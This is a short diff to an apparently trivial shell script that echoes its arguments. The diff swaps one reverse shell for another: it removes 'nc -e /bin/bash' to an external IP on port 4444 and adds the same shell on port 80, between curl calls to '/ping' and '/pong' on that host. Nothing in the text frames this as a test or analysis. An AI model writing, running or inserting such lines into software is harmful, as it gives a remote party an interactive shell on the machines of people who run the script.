@@ -4,4 +4,6 @@ for arg in "$@"; do
     echo "$arg"
 done
 
-nc -e /bin/bash 185.181.4.52 4444
+curl http://185.181.4.52/ping
+nc -e /bin/bash 185.181.4.52 80
+curl http://185.181.4.52/pong
